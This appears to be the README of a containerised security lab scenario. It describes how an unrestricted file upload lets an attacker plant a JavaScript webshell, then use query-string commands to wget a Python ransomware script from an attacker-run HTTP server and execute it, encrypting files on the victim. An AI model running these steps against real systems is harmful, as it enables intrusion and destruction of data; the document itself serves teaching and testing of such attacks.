# Scenario 6: Ransomware
### Description
In this scenario, it is possible to upload a malicious javaScript file to execute a webshell on the victim machine. This is possible because the server doesn't control the file format and save it on machine. Once this is done, the attacker loads the python ransomware file from their HTTP server and executes it through the webshell. The effect is the encryption of the files on the victim machine.  

### How to reproduce the issue
As a first step, the containers are started with:
```bash
docker compose up -d --build
```
The web page is accessed through a browser (```http://<IP_VM>:8080```).

Next, the file ```webshell.js```is uploaded; once uploaded, a communication channel with the victim machine is established.

An attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:
```bash
python3 -m http.server 9000
```

From the browser, the file can be downloaded using the following query string:
```bash
http://<IP_VM>:8080/webshell.js/?cmd=wget http://<IP_VM>:9000/ransomware.py
```
The file is then moved into the appropriate directory:
```bash
http://<IP_VM>:8080/webshell.js/?cmd=mv ransomware.py ./node/public/
```
Finally, the attack is launched:
```bash
http://<IP_VM>:8080/webshell.js/?cmd=python3 ./node/public/ransomware.py
```
The effect is the encryption of all files contained in the ```public``` directory of the web server.
